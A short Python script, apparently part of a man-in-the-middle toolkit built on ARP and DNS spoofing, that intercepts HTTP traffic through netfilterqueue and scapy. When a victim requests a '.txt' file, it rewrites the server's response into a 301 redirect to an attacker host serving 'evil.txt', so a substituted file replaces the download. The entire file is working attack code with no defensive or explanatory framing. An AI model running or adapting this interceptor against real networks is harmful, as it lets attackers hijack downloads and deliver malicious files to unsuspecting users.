from netfilterqueue import Packet 
import scapy.all as scapy 

from arp_spoof import timestamp 
from dns_spoofer import (
    restore_flow,
    redirect_local,
    manipulate_packet_queue,
)


FILE_END = b".txt"
ACK_LIST = []

MODIFIED_LOAD = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.238.128/evil.txt\n"

def set_load(packet: scapy.Packet, load: str = MODIFIED_LOAD):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
     

def process_packet(packet: Packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            if FILE_END in scapy_packet[scapy.Raw].load:
                print(f"{timestamp()} {FILE_END} Request")
                ACK_LIST.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ACK_LIST:
                ACK_LIST.remove(scapy_packet[scapy.TCP].seq)
                print(f"{timestamp()} Replacing File")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet)
                packet.set_payload(bytes(scapy_packet))
                print(f"{timestamp()} Modified File Send")

    packet.accept()
    

if __name__ == "__main__":
	# restore_flow()
	# redirect_local(queue_num=0)
	manipulate_packet_queue(queue_num=0, func=process_packet)